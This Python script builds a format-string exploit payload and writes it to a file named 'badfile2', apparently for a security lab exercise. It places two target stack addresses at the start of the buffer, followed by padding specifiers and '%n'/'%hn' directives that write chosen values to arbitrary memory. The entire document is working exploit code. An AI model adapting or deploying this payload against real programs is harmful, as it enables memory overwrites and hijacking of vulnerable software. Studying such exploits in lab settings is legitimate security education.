import sys

content = bytearray(0x0 for i in range(100))

#Put the address of the beginning
addr1 = 0xffffd714
addr2 = 0xffffd716
content[0:4] = addr2.to_bytes(4, byteorder='little')
content[4:8] = 'aaaa'.encode('latin-1')
content[8:12] = addr1.to_bytes(4, byteorder='little')

#add the format specifiers
C = 4
D1 = 0x6688 - 12 - 8*C
D2 = 0x7799 - 0x6688
s = '%.8x'*C + '%.' + str(D1) + 'x' + '%n' + '%.' + str(D2) + 'x' + '%hn' + '\n'

#store the string to the content bytearray
fmt = s.encode('latin-1')
content[12:12+len(fmt)] = fmt

#write the content to a file
with open('badfile2', 'wb') as f:
    f.write(content)
